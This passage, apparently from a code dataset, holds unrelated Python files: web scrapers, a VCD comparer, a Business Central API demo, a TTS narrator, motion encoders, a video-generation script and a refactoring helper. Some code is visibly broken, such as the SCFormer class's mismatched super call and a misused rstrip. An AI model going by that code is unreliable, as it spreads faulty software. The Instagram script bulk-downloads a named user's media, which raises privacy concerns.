tree.xpath('//h1[@class=\"site-name h3 my-3\"]/text()')\n        if not title:  # \u68c0\u67e5\u662f\u5426\u5b58\u5728\u6807\u9898\n            failed_links.append(link)\n            continue\n\n        # \u63d0\u53d6\u5206\u7c7b\n        classify = tree.xpath(\"//i[contains(@class, 'iconfont icon-arrow-r-m custom-piece_c')]/following-sibling::a[contains(@class, 'btn-cat')]/text()\")\n\n        # \u63d0\u53d6\u7b80\u4ecb\n        synopsis = tree.xpath('//div[@class=\"mt-2\"]/p[@class=\"mb-2\"]/text()')\n\n        # \u63d0\u53d6\u6807\u7b7e\n        label = tree.xpath('//div[@class=\"mt-2\"]/span[@class=\"mr-2\"]/a/text()')\n\n        # \u63d0\u53d6\u94fe\u63a5{1}\u3010\u6709\u4e9b\u7f51\u7ad9\u4f7f\u7528\u7684\u662f\u5b50\u4e3b\u9898\uff0c\u53ef\u80fd\u6709\u4e9b\u5730\u65b9\u5e76\u4e0d\u662f\u5b8c\u5168\u4e00\u6837\uff0c\u6211\u76ee\u524d\u603b\u7ed3\u4e86\u51e0\u79cd\u65b9\u5f0f\uff0c\u770b\u4f60\u4eec\u559c\u6b22\u7528\u54ea\u4e00\u79cd\uff0c\u76ee\u524d\u6211\u6ca1\u6709\u6ce8\u91ca\u7684\u5c31\u662f\u901a\u7528\u7684\uff0c\u51e0\u4e4e\u4e00\u4e3a\u4e3b\u9898\u90fd\u662f\u9002\u7528\u7684\u3011\n        url = tree.xpath('//span[@class=\"site-go-url\"]//a/@href')\n        response_url = requests.get(url[0])\n        html_content_url = response_url.text\n        # \u4f7f\u7528lxml\u89e3\u6790html\u5185\u5bb9\n        tree_link = etree.HTML(html_content_url)\n        url_links = tree_link.xpath('//meta[@http-equiv=\"refresh\"]/@content')[0].split(\";url=\")[1]\n\n\n        # \u63d0\u53d6\u63cf\u8ff0\n        description = tree.xpath('//div[@class=\"panel-body single my-4 \"]//text()')\n\n        row_data = [title[0] if title else \"\", ', '.join(classify).replace(\" \", \"\"), synopsis[0] if synopsis else \"\", ', '.join(label).replace(\" \", \"\"), url_links if url_links else \"\", ', '.join(description).replace(\" \", \"\")]\n        worksheet.append(row_data)\n\n        successful_links.append(link)\n\n        # \u8f93\u51fa\u5904\u7406\u8fdb\u5ea6\u4fe1\u606f\n        print(f\"\u5df2\u5904\u7406 {processed_links}/{total_links} \u6761\u6570\u636e\")\n\n    except Exception as e:\n        failed_links.append(link)\n        print(f\"\u8bbf\u95ee\u94fe\u63a5\u5931\u8d25\uff1a{link}\")\n        print(str(e))\n        continue\n\n# \u4fdd\u5b58Excel\u8868\u683c\nworkbook.save(\"extracted_data[cs].xlsx\")\n\n# \u8f93\u51fa\u5904\u7406\u7ed3\u679c\nprint(\"\u5904\u7406\u5b8c\u6210\uff01\")\nprint(f\"\u6210\u529f\u5904\u7406 {len(successful_links)}/{processed_links} \u6761\u6570\u636e\")\nprint(f\"\u5904\u7406\u5931\u8d25 {len(failed_links)}/{processed_links} \u6761\u6570\u636e\")\n\n# \u68c0\u67e5\u5e76\u521b\u5efa\u5904\u7406\u6210\u529f\u548c\u5904\u7406\u5931\u8d25\u7684\u94fe\u63a5\u6587\u672c\u6587\u4ef6\nif not os.path.isfile(\"successful_links.txt\"):\n    with open(\"successful_links.txt\", \"w\"):\n        pass\n\nif not os.path.isfile(\"failed_links.txt\"):\n    with open(\"failed_links.txt\", \"w\"):\n        pass\n\n# \u5c06\u5904\u7406\u6210\u529f\u548c\u5904\u7406\u5931\u8d25\u7684\u94fe\u63a5\u4fdd\u5b58\u5230\u6587\u672c\u6587\u4ef6\nwith open(\"successful_links.txt\", \"w\") as file:\n    for link in successful_links:\n        file.write(link + \"\\n\")\n\nwith open(\"failed_links.txt\", \"w\") as file:\n    for link in failed_links:\n        file.write(link + \"\\n\")\n",
    "#!/usr/bin/env python3\n\n\"\"\"\nDescription: \nAuthor: Nicolas Gaudin\nDate Created: March 19, 2024\nDate Modified: April 02, 2024\nVersion: 1.0\nPython Version: 3.10.12\nDependencies: time, sys\nLicense: GPL-3.0 License\n\"\"\"\n\n# Utilization\n# 2 vcd files with same signals\n# it compares consequently traces of aimed signals\n# signals to be compared are declared in the variable \"signals\"\n# if you want to analyze a signal from a bloc that is declared multiples times, only the first declared will be analyzed\n# cannot compare 1-bit signal\n\nimport time, sys\nimport argparse\n\ndef searchOccurence(file, signal) -> int:\n    F = []\n    vcdtime = 0\n    invcd1 = 'ffffffffffffffffff' #impossible value \n\n    is_in = 1\n    header = 1\n\n    # printTab(file)\n    with open(file, 'r') as fvcd:\n        for vcd in fvcd:\n            # retrieve trigger start and stop\n            if header == 0:\n                if vcd.find('#',0,1) != -1:\n                    vcdtime = vcd.replace(\"#\",'')\n                    vcdtime = vcdtime.replace(\"\\n\",'')\n                if ((vcd.find(invcd1) != -1) and (vcd.find('b',0,1) != -1)):\n                    listt = []\n                    listt.append(vcdtime)\n                    listt.append(vcd.replace(invcd1,'').replace(\" \\n\",''))\n                    F.append(listt)\n            if vcd.find('#0',0,2) != -1:\n                header = 0\n            if(is_in == 1) :\n                if vcd.find(signal) != -1:\n                    test = vcd.split(' ')\n                    test = list(filter(None, test))\n                    if (len(test) >= 5 ):\n                        if((test[4] == signal) and (len(signal) == len(test[4]))):\n                            invcd1 = test[3]\n                            is_in = 0\n    return F\n\ndef searchDiff(f1, f2, signals) -> int:\n\n    for signal in signals:\n        F1 = searchOccurence(f1, signal)\n        F2 = searchOccurence(f2, signal)\n\n        i = 0 \n        for val1,val2 in zip(F1,F2):\n            if((val1[1] != val2[1]) and i<10000) :\n                if(i==0):\n                    print(signal)\n                    printTab(len(F1))\n                    printTab(len(F2))\n                time1=val1[0]\n                time2=val2[0]\n                bin1 = val1[1].replace('b','')\n                # print(str(hex(int(bin1,2))))\n                bin2 = val2[1].replace('b','')\n                print(str(F1.index(val1)+1)+\"\\t@\"+time1+\" : 0x\"+str(format(int(bin1,2), '08x'))+\" != @\"+time2+\" : 0x\"+str(format(int(bin2,2), '08x')))\n                i+=1\n        if(i !=0):\n            print(\"\\n\")\n    return\n\ndef printTab(*args):\n    args = (\"\\t\",)+args\n    print(*args)\n\ndef main():\n\n    parser = argparse.ArgumentParser(description='VCDcompare - a tool to support when modifying an HDL module ')\n\n    parser.add_argument('-f1', '--file1', type=str, required=True, help='First VCD file path')\n    parser.add_argument('-f2', '--file2', type=str, required=True, help='Second VCD file path')\n    parser.add_argument('-l', '--log', type=str, required=True, help='Log file path')\n    parser.add_argument('-s', '--signals', nargs='+', type=str, required=True, help='List of signals (Example : \"-s ra sp\")')\n    \n    args = parser.parse_args()\n\n    signals = args.signals\n    print(args.signals)\n\n    vcdF1 = args.file1\n    vcdF2 = args.file2\n\n    start_time = time.time_ns()\n\n    old_stdout = sys.stdout\n    log_file = open(args.log, \"w\")\n    sys.stdout = log_file\n\n    searchDiff(vcdF1, vcdF2, signals)\n\n    sys.stdout = old_stdout\n    log_file.close()\n\n\n    end_time = ((time.time_ns() - start_time)) / 1000000\n    print(\"--- %s ms ---\" % end_time)\n\nif __name__ == \"__main__\":\n    main()",
    "from lib.kodi import (\n    get_int_setting,\n    get_boolean_setting,\n    get_setting,\n    set_boolean_setting,\n)\n\n\ndef get_service_host():\n    return get_setting(\"service_host\")\n\n\ndef get_port():\n    return get_int_setting(\"service_port\")\n\n\ndef get_metadata_timeout():\n    return get_int_setting(\"metadata_timeout\")\n\n\ndef get_buffering_timeout():\n    return get_int_setting(\"buffer_timeout\")\n\n\ndef show_status_overlay():\n    return get_boolean_setting(\"overlay\")\n\n\ndef get_min_candidate_size():\n    return get_int_setting(\"min_candidate_size\")\n\n\ndef ask_to_delete_torrent():\n    return get_boolean_setting(\"ask_to_delete\")\n\n\ndef service_enabled():\n    return get_boolean_setting(\"service_enabled\")\n\n\ndef set_service_enabled(value):\n    set_boolean_setting(\"service_enabled\", value)\n\n\ndef ssl_enabled():\n    return get_boolean_setting(\"ssl_connection\")\n\n\ndef get_username():\n    return get_setting(\"service_login\")\n\n\ndef get_password():\n    return get_setting(\"service_password\")\n\n\ndef get_files_order():\n    return get_int_setting(\"files_order\")\n\n\n",
    "# %%[markdown]\n# # Demo: actualizaci\u00f3n de datos de NIF en BC\n#\n# Esta es la pantalla interactiva de Python para Visual Studio Code.\n# Para los que los conozc\u00e1is, es similar a un libro de Jupyter,\n# pero yo prefiero trabajar as\u00ed... escribiendo el script en bloques\n# en modo python, y d\u00e1ndole al bot\u00f3n de \"Run Cell\" para ejecutarlo.\n#\n# La pantalla a la derecha muestra lo ejecutado, y los resultados\n# de la ejecuci\u00f3n, y es una consola *REPL* (Read-Eval-Print Loop)\n# que permite interactuar con los objetos en el entorno.\n#\n# %%\n# Importamos las librer\u00edas necesarias\n\nimport os\nfrom urllib import request\n\nimport dotenv\nimport msgraphhelper\nfrom azure.identity import DefaultAzureCredential\n\n# Cargamos las variables de entorno\ndotenv.load_dotenv()\n\n# Definiciones \u00fatiles\nscope = \"https://api.businesscentral.dynamics.com/.default\"\ntenant = os.environ[\"AZURE_TENANT_ID\"]\nenvironment = os.environ[\"BC_ENVIRONMENT\"]\ncompany = \"PITONESA 06\"\n\n\ncredential = DefaultAzureCredential()\nsession = msgraphhelper.get_graph_session(credential, scope)\n\n# %%[markdown]\n# # Juguemos con el API\n#\n# Lo primero es familiarizarnos con c\u00f3mo funciona el API.\n#\n# El objeto `session` es un interfaz para poder hacer peticiones\n# web. Se pueden hacer `get`, `post`, `patch`, `put` y `delete`.\n#\n# Los APIs de BC est\u00e1n programados con la misma filosof\u00eda que\n# Microsoft Graph - es decir, utilizando el protocolo OData,\n# que es una especializaci\u00f3n del sistema REST, basado en JSON.\n#\n# Empecemos pidiendo un listado de objetos...\n\n# %%\n# Ejemplo 1: Listamos todas las empresas\n#\n# Definimos URL de la API\napi_baseurl = (\n    f\"https://api.businesscentral.dynamics.com/v2.0/{tenant}/{environment}/api/v2.0/\"\n)\n\n# Hacemos la llamada a la API\nresponse = session.get(f\"{api_baseurl}companies\")\nresponse.raise_for_status()  # Si hay un error, se lanza una excepci\u00f3n\nresponse.json()  # Mostramos el resultado\n\n\n# %%[markdown]\n# # B\u00fasquedas en el API\n#\n# Utilizando el parametro `$filter` a\u00f1adido al final de la URL,\n# podemos filtrar por cualquiera de los campos que existen en\n# el JSON que devuelve el API. Hay una serie de operadores que\n# se pueden usar en las expresiones, por ejemplo `eq` (de equal)\n# para igual, `ne` (not equal) para no igual a, `gt` (greater than)\n# para mayor que, etc. Tambien hay operadores m\u00e1s complejos como\n# puede ser `startswith()`.\n\n\n# %%\n# Hacemos el filtro de que el nombre de la empresa sea el que hemos\n# definido arriba. Atenci\u00f3n que las cadenas van en comillas simples.\nparams = {\"$filter\": f\"name eq '{company}'\"}\n\n# Hacemos la llamada a la API\nresponse = session.get(f\"{api_baseurl}companies\", params=params)\nresponse.raise_for_status()  # Si hay un error, se lanza una excepci\u00f3n\nresponse.json()  # Mostramos el resultado\n\n# %%[markdown]\n#\n# # Llamando a instancias de un objeto en OData\n#\n# OData permite llamar a objetos espec\u00edficos poniendo la clave primeria en par\u00e9ntesis.\n#\n# En el caso de Web Services de Business Central la clave principal normalmente es el C\u00f3digo\n# asociado con el objeto, el mismo que declaras como `key(PK; FieldName)` en AL. Se permiten\n# claves de multiples campos. Esto se puede ver analizando el documento Metadatos que\n# puedes consultar llamando al endoint de `$metadata`.\n#\n# En el caso del api standard de Microsoft, optaron por utilizar el campo `id`, que\n# equivale al campo `SystemId` en AL. Esto lo han hecho por mayor compatibilidad con\n# PowerPlatform, pero no para de ser un engorro, porque requiere buscar el `SystemId` de\n# todos los objetos relacionados.\n# %%\n# Guardamos el ID de la empresa\ncompany_id = response.json()[\"value\"][0][\"id\"]\n\n# Aprovechamos para crear una URL base para la empresa\ncompany_baseurl = f\"{api_baseurl}companies({company_id})/\"\n\ncompany_baseurl\n\n# %%\nresponse = session.get(url=company_baseurl)\nresponse.raise_for_status()\nresponse.json()\n\n# %%[markdown]\n# # JSON de un objeto\n#\n# A diferencia del listado de objetos, en el que el resultado va en una lista que se llama\n# `value` dentro del objeto ra\u00edz, aqu\u00ed el objeto ra\u00edz es la repesentaci\u00f3n del objeto OData\n# directamente.\n\n# %%[markdown]\n# # Descargamos los datos de los clientes\n#\n# Esto lo hacemos pidiendo los `customers` de la instancia de `companies`\n# %%\n# Descargamos los datos de los clientes\nresponse = session.get(f\"{company_baseurl}customers\")\nresponse.raise_for_status()  # Si hay un error, se lanza una excepci\u00f3n\ncustomers = response.json()[\"value\"]\ncustomers\n\n# %%[markdown]\n# # Actualizaci\u00f3n de un cliente\n#\n# Los objetos de OData se actualizan enviando una petici\u00f3n `PATCH` a la URL del objeto a\n# actualizar. Como regla general, se debe de hacer una petici\u00f3n `PATCH` por objeto.\n#\n# Para evitar el machaque de datos incorrecto, cada vez que se descarga un objeto, ver\u00e1s\n# que hay una entrada de `@odata.etag` - esto es un indicador del estado actual de la BBDD\n# de BC. Al actualizar el objeto hay que enviar una cabecera de `If-Match` con el contenido\n# de ese etag. Si no se incluye, dar\u00e1 un error. Si no coincide, entonces dar\u00e1 un error.\n\n",
    "import io\nfrom datetime import datetime\nfrom openai import OpenAI\nfrom pydub import AudioSegment\nfrom concurrent.futures import ThreadPoolExecutor\nfrom .utils import ordinal_number, path_to_resource, domain_of_url\nfrom .settings import Settings\nfrom .cost import Cost\nfrom .item_suggestion import ItemSuggestion\n\n\nclass Narrator:\n    def __init__(self) -> None:\n        self.client = OpenAI()\n        self.cost = Cost()\n\n    def narrate(self, items: list[ItemSuggestion], title: str) -> AudioSegment:\n        ranked_items = [item for item in items if item.rank > 0]\n        ranked_items = sorted(ranked_items, key=lambda s: s.rank)\n        with ThreadPoolExecutor() as executor:\n            futures = [executor.submit(self._narrate_single_article, item, idx) for idx, item in enumerate(ranked_items, start=1)]\n            title_future = executor.submit(self._narrate_title, title)\n        segments = [f.result() for f in futures]\n        title_segment = title_future.result()\n        self.cost.add('tts_chars', amount=sum([len(item.text) for item in ranked_items]))\n        output_audio = AudioSegment.empty()\n        output_audio += title_segment\n        for segment in segments:\n            output_audio += segment\n        output_audio += (AudioSegment.silent(duration=1000) + AudioSegment.from_mp3(path_to_resource('outro.mp3')) + AudioSegment.silent(duration=1000))\n        return output_audio\n\n    def _narrate_single_article(self, item: ItemSuggestion, idx: int) -> AudioSegment:\n        response = self.client.audio.speech.create(\n            model=Settings().tts.model,\n            voice=Settings().tts.voice,\n            input=f\"Article {idx} - {item.title}\\nFrom: {domain_of_url(item.url)}\\n\\n{item.text}\"\n        )\n        audio_data = io.BytesIO(response.content) \n        audio_segment = AudioSegment.silent(duration=1000) + AudioSegment.from_file(audio_data, format=\"mp3\")\n        return audio_segment\n    \n    def _narrate_title(self, title: str) -> AudioSegment:\n        now = datetime.now()\n        date_str = f\"{now.strftime('%B')} {ordinal_number(now.day)}, {now.year}\"\n        speech_input = f\"{Settings().editorial.name}: {date_str} - {title}\"\n        self.cost.add('tts_chars', amount=len(speech_input))\n        response = self.client.audio.speech.create(\n            model=Settings().tts.model,\n            voice=Settings().tts.voice,\n            input=speech_input\n        )\n        audio_data = io.BytesIO(response.content) \n        audio_segment = AudioSegment.silent(duration=1000) + AudioSegment.from_file(audio_data, format=\"mp3\")\n        return audio_segment\n    ",
    "import random\nimport math\nimport numpy as np\nimport torch\nimport torch.nn as nn\nimport torch.nn.functional as F\nimport smplx\n\n# ----------- 1 full conv-based encoder------------- #\n\"\"\"\nfrom tm2t\nTM2T: Stochastical and Tokenized Modeling for the Reciprocal Generation of 3D Human Motions and Texts\nhttps://github.com/EricGuo5513/TM2T\n\"\"\"\nfrom .quantizer import *\nfrom .utils.layer import ResBlock, init_weight\n\nclass SCFormer(nn.Module):\n    def __init__(self, args):\n        super(VQEncoderV3, self).__init__()\n\n\n        n_down = args.vae_layer\n        channels = [args.vae_length]\n        for i in range(n_down-1):\n            channels.append(args.vae_length)\n        \n        input_size = args.vae_test_dim\n        assert len(channels) == n_down\n        layers = [\n            nn.Conv1d(input_size, channels[0], 4, 2, 1),\n            nn.LeakyReLU(0.2, inplace=True),\n            ResBlock(channels[0]),\n        ]\n\n        for i in range(1, n_down):\n            layers += [\n                nn.Conv1d(channels[i-1], channels[i], 4, 2, 1),\n                nn.LeakyReLU(0.2, inplace=True),\n                ResBlock(channels[i]),\n            ]\n        self.main = nn.Sequential(*layers)\n        # self.out_net = nn.Linear(output_size, output_size)\n        self.main.apply(init_weight)\n        # self.out_net.apply(init_weight)\n    def forward(self, inputs): # bs t n\n        '''\n        face 51 or 106\n        hand 30*(15)\n        upper body \n        lower body \n        global 1*3 \n        max length around 180 --> 450\n        '''\n        bs, t, n = inputs.shape\n        inputs = inputs.reshape(bs*t, n)\n        inputs = self.spatial_transformer_encoder(inputs) # bs*t c\n        cs = inputs.shape[1]\n        inputs = inputs.reshape(bs, t, cs).permute(0, 2, 1).reshape(bs*cs, t)\n        inputs = self.temporal_cnn_encoder(inputs) # bs*c t\n        ct = inputs.shape[1]\n        outputs = inputs.reshape(bs, cs, ct).permute(0, 2, 1) # bs ct cs\n        return outputs\n\nclass VQEncoderV3(nn.Module):\n    def __init__(self, args):\n        super(VQEncoderV3, self).__init__()\n        n_down = args.vae_layer\n        channels = [args.vae_length]\n        for i in range(n_down-1):\n            channels.append(args.vae_length)\n        \n        input_size = args.vae_test_dim\n        assert len(channels) == n_down\n        layers = [\n            nn.Conv1d(input_size, channels[0], 4, 2, 1),\n            nn.LeakyReLU(0.2, inplace=True),\n            ResBlock(channels[0]),\n        ]\n\n        for i in range(1, n_down):\n            layers += [\n                nn.Conv1d(channels[i-1], channels[i], 4, 2, 1),\n                nn.LeakyReLU(0.2, inplace=True),\n                ResBlock(channels[i]),\n            ]\n        self.main = nn.Sequential(*layers)\n        # self.out_net = nn.Linear(output_size, output_size)\n        self.main.apply(init_weight)\n        # self.out_net.apply(init_weight)\n    def forward(self, inputs):\n        inputs = inputs.permute(0, 2, 1)\n        outputs = self.main(inputs).permute(0, 2, 1)\n        return outputs\n\nclass VQEncoderV6(nn.Module):\n    def __init__(self, args):\n        super(VQEncoderV6, self).__init__()\n        n_down = args.vae_layer\n        channels = [args.vae_length]\n        for i in range(n_down-1):\n            channels.append(args.vae_length)\n        \n        input_size = args.vae_test_dim\n        assert len(channels) == n_down\n        layers = [\n            nn.Conv1d(input_size, channels[0], 3, 1, 1),\n            nn.LeakyReLU(0.2, inplace=True),\n            ResBlock(channels[0]),\n        ]\n\n        for i in range(1, n_down):\n            layers += [\n                nn.Conv1d(channels[i-1], channels[i], 3, 1, 1),\n                nn.LeakyReLU(0.2, inplace=True),\n                ResBlock(channels[i]),\n            ]\n        self.main = nn.Sequential(*layers)\n        # self.out_net = nn.Linear(output_size, output_size)\n        self.main.apply(init_weight)\n        # self.out_net.apply(init_weight)\n    def forward(self, inputs):\n        inputs = inputs.permute(0, 2, 1)\n        outputs = self.main(inputs).permute(0, 2, 1)\n        return outputs\n\nclass VQEncoderV4(nn.Module):\n    def __init__(self, args):\n        super(VQEncoderV4, self).__init__()\n        n_down = args.vae_layer\n        channels = [args.vae_length]\n        for i in range(n_down-1):\n            channels.append(args.vae_length)\n        \n        input_size = args.vae_test_dim\n        assert len(channels) == n_down\n        layers = [\n            nn.Conv1d(input_size, channels[0], 4, 2, 1),\n            nn.LeakyReLU(0.2, inplace=True),\n            ResBlock(channels[0]),\n        ]\n\n        for i in range(1, n_down):\n            layers += [\n                nn.Conv1d(channels[i-1], channels[i], 3, 1, 1),\n                nn.LeakyReLU(0.2, inplace=True),\n                ResBlock(channels[i]),\n            ]\n        self.main = nn.Sequential(*layers)\n        # self.out_net = nn.Linear(output_size, output_size)\n        self.main.apply(init_weight)\n        # self.out_net.apply(init_weight",
    "import os\nimport cv2\nimport torch\nimport argparse\nfrom diffusers import DiffusionPipeline\nfrom diffusers import I2VGenXLPipeline\nfrom diffusers.utils import export_to_video, load_image\nfrom moviepy.editor import VideoFileClip, concatenate_videoclips\n\ndef extract_last_frame(video_path, iteration, path):\n    video = cv2.VideoCapture(video_path)\n    total_frames = int(video.get(cv2.CAP_PROP_FRAME_COUNT))\n    frame_to_capture = total_frames - 2\n    video.set(cv2.CAP_PROP_POS_FRAMES, frame_to_capture)\n    ret, frame = video.read()\n    if ret:\n        image_path = path + 'frame_part' + str(iteration + 1) + '.jpg'\n        cv2.imwrite(image_path, frame)\n        print(\"Last frame saved at:\", image_path)\n    else:\n        print(\"Failed to extract last frame\")\n    video.release()\n\ndef trim_last_frame(video_path):\n    cap = cv2.VideoCapture(video_path)\n    if not cap.isOpened():\n        print(f\"Unable to open video file: {video_path}\")\n        return None\n    \n    frame_count = int(cap.get(cv2.CAP_PROP_FRAME_COUNT))\n    if frame_count < 2:\n        print(f\"Not enough video frames: {video_path}\")\n        return None\n    \n    frames = []\n    for _ in range(frame_count - 1):\n        ret, frame = cap.read()\n        if not ret:\n            break\n        frames.append(frame)\n    \n    cap.release()\n    return frames\n\ndef concatenate_videos(video_paths, output_path, frame_rate):\n    fourcc = cv2.VideoWriter_fourcc(*'mp4v')\n    video_size = None\n    all_frames = []\n    for video_path in video_paths:\n        frames = trim_last_frame(video_path)\n        if frames is not None:\n            all_frames.extend(frames)\n            if video_size is None:\n                video_size = (frames[0].shape[1], frames[0].shape[0])\n    \n    if len(all_frames) == 0:\n        print(\"No valid video frames\")\n        return\n\n    out = cv2.VideoWriter(output_path, fourcc, frame_rate, video_size)\n    for frame in all_frames:\n        out.write(frame)\n    out.release()\n\ndef inference(meta, args):\n    os.makedirs(meta['foldername'], exist_ok=True)\n    # load pretrained models: t2i: stable diffusion xl; i2v: i2vgen-xl\n    sdxl_base = DiffusionPipeline.from_pretrained(\n        \"stabilityai/stable-diffusion-xl-base-1.0\", torch_dtype=torch.float16, variant=\"fp16\", use_safetensors=True\n    ).to(\"cuda\")\n    sdxl_refiner = DiffusionPipeline.from_pretrained(\n        \"stabilityai/stable-diffusion-xl-refiner-1.0\", text_encoder_2=sdxl_base.text_encoder_2, vae=sdxl_base.vae, torch_dtype=torch.float16, use_safetensors=True, variant=\"fp16\",\n    ).to(\"cuda\")\n    pipeline = I2VGenXLPipeline.from_pretrained(\"ali-vilab/I2VGen-XL\", torch_dtype=torch.float16, variant=\"fp16\").to(\"cuda\")\n    # pipeline.enable_model_cpu_offload()\n    generator = torch.manual_seed(args.seed)\n\n    if args.test_initial_prompt:\n        prompt = meta['prompt']\n    else:\n        prompt = meta['llm_prompt']\n\n    image = sdxl_base(prompt=prompt[0], width=1280, height=720, num_inference_steps=40, denoising_end=0.8, output_type=\"latent\").images\n    image = sdxl_refiner(prompt=prompt[0], num_inference_steps=40, denoising_start=0.8, image=image).images[0].save(meta['foldername'] + 'frame_part0.jpg')\n\n    all_video_paths = []\n    for i in range(len(prompt)):\n        image = load_image(meta['foldername'] + 'frame_part' + str(i) + '.jpg').convert(\"RGB\")\n        frames = pipeline(\n            prompt=prompt[0],\n            image=image,\n            height=720,\n            width=1280,\n            target_fps = args.fps,\n            num_inference_steps=50,\n            negative_prompt=meta['negative_prompt'],\n            guidance_scale=9.0,\n            generator=generator\n        ).frames[0]\n        save_path = meta['foldername'] + 'generated_part_' + str(i) + '.mp4'\n        all_video_paths.append(save_path)\n        export_to_video(frames, save_path, fps=args.fps)\n        extract_last_frame(save_path, i, meta['foldername'])\n    concatenate_videos(all_video_paths, meta['foldername'] + 'final.mp4', args.fps)\n\n\n\nif __name__ == \"__main__\":\n    \n    parser = argparse.ArgumentParser()\n    parser.add_argument(\"--seed\", type=int, default=522112, help=\"random seed\")\n    parser.add_argument('--test_initial_prompt',action='store_true', help=\"use prompt to generate\")\n    parser.add_argument(\"--fps\", type=int, default=16, help=\"fps of the generated video\")\n    args = parser.parse_args()\n\n    meta = dict(\n                prompt = [\"A grizzly bear hunting for fish in a river at the edge of a waterfall\"],\n                llm_prompt = [\"In the scenic wilderness, a majestic grizzly bear stands at the edge of a breathtaking waterfall, surveying the rushing river below\",\n                              \"With focused determination, the bear dives into the crystal-clear water, skillfully navigating the strong currents as it searches for fish\",\n                              \"Using its powerful paws and sharp claws, the bear swiftly catches a leaping fish from the river, showcasing its exceptional hunting skills and primal strength\"], \n       ",
    "\r\n\"\"\"\r\nCreated By *Abdullah EL-Yamany*\r\n-------------------------------\r\n\"\"\"\r\n\r\nfrom selenium import webdriver\r\nfrom selenium.webdriver.common.by import By\r\nimport time, urllib.request\r\n\r\ndriver = webdriver.Chrome()\r\ndriver.maximize_window()\r\ndriver.get(\"https://www.instagram.com/\")\r\n\r\ntime.sleep(2)\r\n\r\n# -------- Login ------- #\r\nwhile True:\r\n    try:\r\n        username = driver.find_element(By.CSS_SELECTOR, 'input[name=\"username\"]')\r\n        password = driver.find_element(By.CSS_SELECTOR, 'input[name=\"password\"]')\r\n        break\r\n    except:\r\n        time.sleep(3)\r\n\r\nusername.clear()\r\npassword.clear()\r\n\r\nusername.send_keys(\"xxxxxxxxxxxx\") # Write Email or Phone\r\npassword.send_keys(\"xxxxxxxxxxxx\") # Write Password\r\n\r\ntime.sleep(1)\r\nlogin = driver.find_element(By.CSS_SELECTOR, 'button[type=\"submit\"]').click()\r\n\r\n#save your login info?\r\nwhile True:\r\n    time.sleep(5)\r\n    try:\r\n        notnow = driver.find_element(By.XPATH, '//div[@class=\"_ac8f\"]/div[@role=\"button\"]').click()\r\n        break\r\n    except:\r\n        continue\r\n\r\n\r\n#turn on notif\r\ntime.sleep(2)\r\nnotnow2 = driver.find_element(By.XPATH, \"//button[contains(text(), 'Not Now')]\").click()\r\n\r\nname_search = \"xxxxxxxxxxxx\" # Write Username Of Account\r\n\r\nurl = f\"https://www.instagram.com/{name_search}/\"\r\n\r\ntime.sleep(3)\r\ndriver.get(url)\r\ntime.sleep(10)\r\n\r\n\r\n#scroll\r\nscrolldown=driver.execute_script(\"window.scrollTo(0, document.body.scrollHeight);var scrolldown=document.body.scrollHeight;return scrolldown;\")\r\nmatch=False\r\nposts = []\r\nwhile(match==False):\r\n    last_count = scrolldown\r\n    time.sleep(3)\r\n    scrolldown = driver.execute_script(\"window.scrollTo(0, document.body.scrollHeight);var scrolldown=document.body.scrollHeight;return scrolldown;\")\r\n\r\n    links = driver.find_elements(By.TAG_NAME, \"a\")\r\n    for link in links:\r\n        try:\r\n            post = link.get_attribute('href')\r\n        except:\r\n            continue\r\n        if post not in posts:\r\n            if '/p/' in post:\r\n                posts.append(post)\r\n\r\n\r\n    if last_count==scrolldown:\r\n        match=True\r\n\r\n\r\nimgs_link = []\r\nnumber = 1\r\n\r\n#get videos and images\r\ndownload_url = ''\r\nfor post in posts:\r\n    driver.get(post)\r\n    shortcode = driver.current_url.split('/')[-2]\r\n    num = 1\r\n    time.sleep(3)\r\n\r\n    main_div = driver.find_element(By.CSS_SELECTOR, 'div[class=\"x6s0dn4 x1dqoszc xu3j5b3 xm81vs4 x78zum5 x1iyjqo2 x1tjbqro\"]')\r\n\r\n    while True:\r\n        imgs = main_div.find_elements(By.CSS_SELECTOR, \"img[style='object-fit: cover;']\")\r\n        for img in imgs:\r\n            link = img.get_attribute('src')\r\n            if link not in imgs_link:\r\n                urllib.request.urlretrieve(link, f'img_{number}{shortcode}{num}.jpg')\r\n                num += 1\r\n                imgs_link.append(link)\r\n\r\n                time.sleep(5)\r\n\r\n        try:\r\n            driver.find_element(By.CSS_SELECTOR, 'button[aria-label=\"Next\"]').click()\r\n            time.sleep(3)\r\n        except:\r\n            number += 1\r\n            break\r\n",
    "import itertools\nimport re\nfrom dataclasses import dataclass, field\nfrom pathlib import Path\n\nfrom pyfactoring.settings import common_settings\n\n\n@dataclass(frozen=True)\nclass TemplatedFunc:\n    name: str\n    definition: str = field(repr=False)\n    is_async: bool\n    in_func: bool\n\n    def call(self, params: list[str]) -> str:\n        awaitable = \"await \" if self.is_async else \"\"\n        params = \", \".join(params)\n        return f\"{awaitable}{self.name}({params})\"\n\n    def import_from(self, path: Path) -> str:\n        module = \".\".join(path.parts)\n        module = module.rstrip(\".py\")\n        return f\"from {module} import {self.name}\"\n\n    @staticmethod\n    def make(idx: int, filepath: Path, template: str) -> \"TemplatedFunc\":\n        filename = filepath.name.rstrip(\".py\")\n        func_template = \"# Pyfactoring: rename this!\\n{} {}({}):\\n{}\"\n\n        is_func = \"__function__\" in template\n        is_async = \"async\" in template or \"await\" in template\n        prefix_def = \"async def\" if is_async else \"def\"\n\n        variables = sorted(set(re.findall(r\"__var_\\d+__\", template)))\n\n        if common_settings.pack_consts:\n            params = \", \".join(variables)\n            params = f\"{params}, *consts\"\n        else:\n            constants = sorted(set(re.findall(r\"__const_\\d+__\", template)))\n            params = \", \".join(itertools.chain(variables, constants))\n\n        name = f\"{filename}_func_{idx}\"\n        if common_settings.pack_consts:\n            body = re.sub(r\"'__const_(\\d+)__'\", r\"consts[\\1]\", template)\n        else:\n            body = re.sub(r\"'(__const_\\d+__)'\", r\"\\1\", template)\n\n        if is_func:\n            body = \"\\n\".join(f\"    {body}\".splitlines()[1:])\n        else:\n            body = \"\\n    \".join(f\"    {body}\".splitlines())\n\n        definition = func_template.format(\n            prefix_def,\n            name,\n            params,\n            body,\n        )\n\n        return TemplatedFunc(name, definition, is_async, is_func)\n",
